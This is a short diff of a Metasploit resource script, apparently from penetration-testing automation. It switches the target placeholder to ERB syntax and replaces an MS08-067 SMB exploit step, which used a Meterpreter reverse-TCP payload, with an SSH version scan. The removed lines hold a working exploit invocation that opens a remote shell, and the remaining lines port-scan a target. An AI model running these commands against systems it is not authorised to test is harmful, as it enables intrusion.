@@ -1,10 +1,10 @@
 use auxiliary/scanner/portscan/tcp
-set RHOSTS __TARGET_IP__
+set RHOSTS <%= target_ip %>
 set THREADS 10
 run
 
-use exploit/windows/smb/ms08_067_netapi
-set RHOST __TARGET_IP__
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST __TARGET_IP__
-exploit -j
+use auxiliary/scanner/ssh/ssh_version
+set RHOSTS <%= target_ip %>
+run
+
+exit
